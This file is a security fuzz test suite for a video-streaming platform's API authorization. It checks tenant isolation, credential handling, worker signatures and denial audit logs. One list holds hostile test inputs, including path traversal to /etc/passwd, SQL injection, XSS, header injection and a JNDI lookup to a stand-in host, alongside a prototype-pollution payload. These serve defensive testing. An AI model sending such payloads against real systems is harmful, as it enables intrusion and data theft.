import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { z } from "zod";
import type { Firestore } from "@/lib/server/firebase-admin";
import { Firestore as FirestoreClass, ApiError } from "@/lib/server/firebase-admin";
import * as apiModule from "@/lib/server/api";
import { errorBody } from "@/lib/server/api";
import { assertAuthenticationSessionActive } from "@/lib/server/auth-session-revocation";
import {
  requirePlatformRole,
  requireZillionaireModule,
  requireProviderAccess,
  type ZillionaireModule,
} from "@/lib/server/roles";
import { requireChannelPermission } from "@/lib/server/channel-access";
import { requireVideoWorker } from "@/lib/server/video-worker-auth";
import { createRoleIsolationStore, type MockDoc } from "@/test/role-isolation-harness";
import { Route as ExportRoute } from "@/routes/api/public/v1/account/export";
import { Route as ProducerAssetsRoute } from "@/routes/api/public/v1/producer/channels/$channelId/assets";
import { Route as ProviderStatementsRoute } from "@/routes/api/public/v1/provider/statements";
import { Route as NotificationsRoute } from "@/routes/api/public/v1/notifications";
import { Route as NotificationReadRoute } from "@/routes/api/public/v1/notifications/$notificationId/read";
// @ts-expect-error - dynamic build script import without d.ts
import { buildMatrix } from "../../scripts/route-access-matrix.mjs";
import expectedCases from "./fixtures/role-matrix-routes.json";

const originalEnv = { ...process.env };

function user(
  uid: string,
  email: string,
  emailVerified = true,
  authTime = Math.floor(Date.now() / 1000),
) {
  return {
    uid,
    email,
    emailVerified,
    authTime,
    issuedAt: authTime,
    customClaims: {},
  };
}

function seedFuzzStore() {
  return createRoleIsolationStore({
    "users/viewer": { email: "viewer@example.test", roleTags: [], accountStatus: "ACTIVE" },
    "users/producer-a": {
      email: "producer-a@example.test",
      roleTags: ["producer"],
      accountStatus: "ACTIVE",
    },
    "producers/producer-a": { planStatus: "ACTIVE", verificationStatus: "APPROVED" },
    "users/producer-b": {
      email: "producer-b@example.test",
      roleTags: ["producer"],
      accountStatus: "ACTIVE",
    },
    "producers/producer-b": { planStatus: "ACTIVE", verificationStatus: "APPROVED" },
    "users/provider-a": { email: "provider-a@example.test", roleTags: [], accountStatus: "ACTIVE" },
    "providerUsers/provider-a": { status: "ACTIVE", providerId: "tenant-a" },
    "users/provider-b": { email: "provider-b@example.test", roleTags: [], accountStatus: "ACTIVE" },
    "providerUsers/provider-b": { status: "ACTIVE", providerId: "tenant-b" },
    "users/delegate": {
      email: "delegate@example.test",
      roleTags: [],
      accountStatus: "ACTIVE",
      zillionaireModules: ["security", "support"],
    },
    "users/owner": { email: "owner@zillionaire.test", roleTags: [], accountStatus: "ACTIVE" },
    "channels/channel-a": { ownerUid: "producer-a", title: "Channel A", published: true },
    "channels/channel-b": { ownerUid: "producer-b", title: "Channel B", published: true },
    "contentAssets/asset-a": {
      ownerUid: "producer-a",
      channelId: "channel-a",
      status: "uploaded_pending_transcode",
    },
    "contentAssets/asset-b": {
      ownerUid: "producer-b",
      channelId: "channel-b",
      status: "uploaded_pending_transcode",
    },
    "liveChannels/live-a": { providerId: "tenant-a", status: "published", title: "Live A" },
    "liveChannels/live-b": { providerId: "tenant-b", status: "published", title: "Live B" },
    "providerContracts/contract-a": { providerId: "tenant-a", agreementReference: "CONTRACT-A" },
    "providerContracts/contract-b": { providerId: "tenant-b", agreementReference: "CONTRACT-B" },
    "providerStatements/statement-a": {
      providerId: "tenant-a",
      status: "closed",
      grossRevenueMinor: 1000,
    },
    "providerStatements/statement-b": {
      providerId: "tenant-b",
      status: "closed",
      grossRevenueMinor: 2000,
    },
    "providerDisputes/dispute-a": { providerId: "tenant-a", subject: "Dispute A", messages: [] },
    "providerDisputes/dispute-b": { providerId: "tenant-b", subject: "Dispute B", messages: [] },
    "users/viewer/notifications/notice-v": {
      title: "Viewer Notice",
      body: "Private",
      createdAt: "2026-01-01",
    },
  });
}

describe("Batch 14: Deny-by-Default Fuzz Suite", () => {
  let fs: Firestore;
  let store: Map<string, MockDoc>;
  const startTime = Date.now();

  beforeEach(() => {
    process.env["ZILLIONAIRE_EMAIL"] = "owner@zillionaire.test";
    process.env["AUDIT_HASH_KEY"] = "fuzz-test-audit-hmac-secret-32b!";
    process.env["VIDEO_WORKER_KEYS_JSON"] = JSON.stringify({
      "worker-1": "worker-secret-key-at-least-48-characters-long-for-testing-12345",
    });
    const seeded = seedFuzzStore();
    fs = seeded.fs;
    store = seeded.store;
    vi.spyOn(FirestoreClass, "create").mockResolvedValue(fs);
  });

  afterEach(() => {
    vi.restoreAllMocks();
    process.env = { ...originalEnv };
  });

  describe("Section 1: Automated Route Matrix Negative Request Generation", () => {
    const routeKey = (route: { route: string; file: string }) =>
      `${route.route}\u0000${route.file}`;
    const discovered = buildMatrix() as Array<{ route: string; file: string; type: string }>;
    const matrix = [...new Map(discovered.map((route) => [routeKey(route), route])).values()];
    const routeCases = expectedCases as Array<{
      route: string;
      file: string;
      guard: string;
      expected: Record<string, number>;
    }>;

    it("verifies all discovered routes have non-200 deny expectations for unauthorized callers", () => {
      expect(matrix.length).toBe(routeCases.length);
      for (const route of routeCases) {
        const hasDenial = Object.values(route.expected).some(
          (status) => status === 401 || status === 403,
        );
        if (route.guard !== "public") {
          expect(
            hasDenial,
            `Route ${route.route} (${route.guard}) must deny at least one role`,
          ).toBe(true);
        }
      }
    });

    it("evaluates negative role access across all matrix guard types without 5xx errors", async () => {
      const viewerUser = user("viewer", "viewer@example.test");
      const prodAUser = user("producer-a", "producer-a@example.test");
      const delegateUser = user("delegate", "delegate@example.test");

      await expect(requireZillionaireModule(fs, viewerUser, "pricing")).rejects.toMatchObject({
        status: 403,
        code: "ZILLIONAIRE_SCOPE_REQUIRED",
      });
      await expect(requirePlatformRole(fs, viewerUser, "producer")).rejects.toMatchObject({
        status: 403,
        code: "FORBIDDEN",
      });
      await expect(requireProviderAccess(fs, viewerUser, "tenant-a")).rejects.toMatchObject({
        status: 403,
        code: "PROVIDER_ROLE_REQUIRED",
      });
      await expect(requireProviderAccess(fs, prodAUser, "tenant-a")).rejects.toMatchObject({
        status: 403,
        code: "PROVIDER_ROLE_REQUIRED",
      });
      await expect(
        requireChannelPermission(fs, "channel-a", "provider-a", "video.upload"),
      ).rejects.toMatchObject({
        status: 403,
      });
      await expect(
        requireZillionaireModule(fs, delegateUser, "pricing" as ZillionaireModule),
      ).rejects.toMatchObject({
        status: 403,
        code: "ZILLIONAIRE_SCOPE_REQUIRED",
      });
    });
  });

  describe("Section 2: Swapped Tenant IDs Fuzz (Strict Cross-Tenant Isolation)", () => {
    it("rejects swapped producer tenant IDs on channel asset manipulation", async () => {
      vi.spyOn(apiModule, "requireUser").mockResolvedValue(
        user("producer-b", "producer-b@example.test"),
      );
      const handler = (
        ProducerAssetsRoute.options.server as unknown as {
          handlers: {
            POST: (ctx: { request: Request; params: { channelId: string } }) => Promise<Response>;
          };
        }
      ).handlers.POST;
      const swappedPayload = {
        assetId: "asset-a",
        title: "Malicious Cross-Tenant Tampering",
        description: "",
        category: "Drama",
        territoryCodes: ["NG"],
        platforms: ["web"],
        validFrom: "2026-01-01T00:00:00.000Z",
        validUntil: "2027-01-01T00:00:00.000Z",
        rightsEvidencePath: "producers/producer-b/channel-a/evidence.pdf",
      };
      const response = await handler({
        request: new Request(
          "https://tv.bqsqwad.com/api/public/v1/producer/channels/channel-a/assets",
          {
            method: "POST",
            headers: { "content-type": "application/json" },
            body: JSON.stringify(swappedPayload),
          },
        ),
        params: { channelId: "channel-a" },
      });
      expect(response.status).toBe(403);
      const body = await response.json();
      expect(body).toMatchObject({ error: expect.any(String), code: expect.any(String) });
      expect(JSON.stringify(body)).not.toContain("asset-b");
      expect(JSON.stringify(body)).not.toContain("producer-a@example.test");
    });

    it("rejects swapped provider tenant IDs on statements", async () => {
      vi.spyOn(apiModule, "requireUser").mockResolvedValue(
        user("provider-a", "provider-a@example.test"),
      );
      const handler = (
        ProviderStatementsRoute.options.server as unknown as {
          handlers: { GET: (ctx: { request: Request }) => Promise<Response> };
        }
      ).handlers.GET;
      const response = await handler({
        request: new Request(
          "https://tv.bqsqwad.com/api/public/v1/provider/statements?statementId=statement-b",
        ),
      });
      expect(response.status).toBe(403);
      const body = await response.json();
      expect(body.code).toBe("PROVIDER_ISOLATION_VIOLATION");
      expect(JSON.stringify(body)).not.toContain("statement-b");
      expect(JSON.stringify(body)).not.toContain("tenant-b");
    });
  });

  describe("Section 3: Missing and Expired Credentials Fuzz", () => {
    it("rejects missing authorization header with 401 UNAUTHENTICATED", async () => {
      const handler = (
        ExportRoute.options.server as unknown as {
          handlers: { GET: (ctx: { request: Request }) => Promise<Response> };
        }
      ).handlers.GET;
      const response = await handler({
        request: new Request("https://tv.bqsqwad.com/api/public/v1/account/export"),
      });
      expect(response.status).toBe(401);
      expect(await response.json()).toMatchObject({
        code: "UNAUTHENTICATED",
      });
    });

    it("rejects malformed authorization schemes", async () => {
      const handler = (
        ExportRoute.options.server as unknown as {
          handlers: { GET: (ctx: { request: Request }) => Promise<Response> };
        }
      ).handlers.GET;
      for (const authHeader of [
        "Basic dXNlcjpwYXNz",
        "Token 1234567890",
        "Bearer",
        "",
        "CustomToken abc",
      ]) {
        const response = await handler({
          request: new Request("https://tv.bqsqwad.com/api/public/v1/account/export", {
            headers: { authorization: authHeader },
          }),
        });
        expect(response.status).toBe(401);
        expect((await response.json()).code).toBe("UNAUTHENTICATED");
      }
    });

    it("rejects revoked sessions with 401 AUTH_SESSION_REVOKED", () => {
      expect(() => assertAuthenticationSessionActive({ sessionsRevokedAfter: 200 }, 100)).toThrow(
        expect.objectContaining({ status: 401, code: "AUTH_SESSION_REVOKED" }),
      );
    });
  });

  describe("Section 4: Malformed IDs and Injection Vectors Fuzz", () => {
    const maliciousIds = [
      "../../etc/passwd",
      "..%2F..%2Fetc%2Fpasswd",
      "channel-a\0injected",
      "channel-a' OR '1'='1",
      "<script>alert('xss')</script>",
      "A".repeat(2048),
      "channel-a\r\nHeader: Injected",
      "${jndi:ldap://evil.test}",
    ];

    it("safely handles malformed and injection IDs without 5xx errors", async () => {
      vi.spyOn(apiModule, "requireUser").mockResolvedValue(user("viewer", "viewer@example.test"));
      const handler = (
        NotificationReadRoute.options.server as unknown as {
          handlers: {
            POST: (ctx: {
              request: Request;
              params: { notificationId: string };
            }) => Promise<Response>;
          };
        }
      ).handlers.POST;
      for (const badId of maliciousIds) {
        const response = await handler({
          request: new Request(
            `https://tv.bqsqwad.com/api/public/v1/notifications/${encodeURIComponent(badId)}/read`,
            {
              method: "POST",
            },
          ),
          params: { notificationId: badId },
        });
        expect(response.status).toBeGreaterThanOrEqual(400);
        expect(response.status).toBeLessThan(500);
        const body = await response.json();
        expect(body).toHaveProperty("error");
        expect(body).toHaveProperty("code");
        expect(JSON.stringify(body)).not.toContain("at ");
        expect(JSON.stringify(body)).not.toContain("node_modules");
      }
    });
  });

  describe("Section 5: Oversized Bodies and Corrupted JSON Fuzz", () => {
    it("handles invalid and malformed JSON payloads gracefully", async () => {
      for (const bodyStr of [
        "{ unclosed json",
        '{"key": undefined}',
        "",
        "Not JSON at all",
        '{\n  "nested": {\n    "deep": [1, 2, 3,\n',
      ]) {
        const req = new Request("https://tv.bqsqwad.com/api/test", {
          method: "POST",
          headers: { "content-type": "application/json" },
          body: bodyStr,
        });
        await expect(apiModule.parseBody(req, z.object({}))).rejects.toMatchObject({
          status: 400,
          code: "INVALID_REQUEST",
        });
      }
    });

    it("formats Zod and ApiErrors into consistent error responses via errorBody", () => {
      const apiErr = new ApiError(403, "TEST_DENIED", "You cannot do this.");
      expect(errorBody(apiErr).status).toBe(403);
      const zodErr = new z.ZodError([
        {
          code: "invalid_type",
          expected: "string",
          received: "number",
          path: ["title"],
          message: "Expected string",
        },
      ]);
      expect(errorBody(zodErr).status).toBe(400);
      const spyConsole = vi.spyOn(console, "error").mockImplementation(() => {});
      const unknownErr = new Error("Database connection dropped at /internal/secrets.ts:42");
      const response = errorBody(unknownErr);
      expect(response.status).toBe(500);
      expect(response.headers.get("content-type")).toContain("application/json");
      spyConsole.mockRestore();
    });
  });

  describe("Section 6: Unknown Fields & Prototype Pollution Fuzz", () => {
    it("strips privilege-escalation and prototype pollution fields", () => {
      const schema = z.object({ name: z.string(), count: z.number().optional() });
      const polluted = JSON.parse(
        '{"name": "Valid", "__proto__": {"isAdmin": true}, "constructor": {"prototype": {"admin": true}}, "isZillionaireOwner": true, "roles": ["owner"]}',
      );
      const parsed = schema.parse(polluted);
      expect(parsed).toEqual({ name: "Valid" });
      expect((parsed as Record<string, unknown>)["isZillionaireOwner"]).toBeUndefined();
      expect((parsed as Record<string, unknown>)["roles"]).toBeUndefined();
      expect(({} as Record<string, unknown>)["isAdmin"]).toBeUndefined();
    });
  });

  describe("Section 7: Replayed & Invalid Worker Signatures Fuzz", () => {
    it("rejects missing worker headers", async () => {
      const request = new Request("https://tv.bqsqwad.com/api/public/v1/worker/maintenance/run", {
        method: "POST",
      });
      await expect(requireVideoWorker(request, fs)).rejects.toMatchObject({
        status: 401,
        code: "WORKER_AUTH_INVALID",
      });
    });

    it("rejects stale worker timestamps", async () => {
      const request = new Request("https://tv.bqsqwad.com/api/public/v1/worker/maintenance/run", {
        method: "POST",
        headers: {
          "x-video-worker-id": "worker-1",
          "x-video-worker-timestamp": String(Math.floor(Date.now() / 1000) - 600),
          "x-video-worker-nonce": "nonce-12345",
          "x-video-worker-signature": "sha256=invalid-signature",
        },
      });
      await expect(requireVideoWorker(request, fs)).rejects.toMatchObject({
        status: 401,
        code: "WORKER_AUTH_INVALID",
      });
    });

    it("rejects forged worker signatures", async () => {
      const request = new Request("https://tv.bqsqwad.com/api/public/v1/worker/maintenance/run", {
        method: "POST",
        headers: {
          "x-video-worker-id": "worker-1",
          "x-video-worker-timestamp": String(Math.floor(Date.now() / 1000)),
          "x-video-worker-nonce": "nonce-fake",
          "x-video-worker-signature": `sha256=${"0".repeat(64)}`,
        },
      });
      await expect(requireVideoWorker(request, fs)).rejects.toMatchObject({
        status: 401,
        code: "WORKER_AUTH_INVALID",
      });
    });
  });

  describe("Section 8: Denial Audit Event Logging Verification", () => {
    it("records privacy-safe access denial audit events", async () => {
      const attacker = user("viewer-attacker", "attacker@example.test");
      await expect(requirePlatformRole(fs, attacker, "producer")).rejects.toMatchObject({
        status: 403,
      });
      await expect(requireProviderAccess(fs, attacker, "tenant-a")).rejects.toMatchObject({
        status: 403,
      });
      const denialDocs = [...store.entries()].filter(([key]) => key.startsWith("accessDenials/"));
      expect(denialDocs.length).toBeGreaterThanOrEqual(1);
      for (const [, doc] of denialDocs) {
        expect(doc).toMatchObject({
          actorHash: expect.any(String),
          actorRoleClass: expect.any(String),
          routePattern: expect.any(String),
          method: expect.any(String),
          reasonCode: expect.any(String),
          coarseNetworkHash: expect.any(String),
          expiresAt: expect.any(String),
          time: expect.any(String),
        });
        const serialized = JSON.stringify(doc);
        expect(serialized).not.toContain("attacker@example.test");
        expect(serialized).not.toContain("owner@zillionaire.test");
      }
    });
  });

  describe("Section 9: Performance and Execution Budget", () => {
    it("executes the fuzzing suite within the two-minute budget", () => {
      expect((Date.now() - startTime) / 1000).toBeLessThan(120);
    });
  });
});
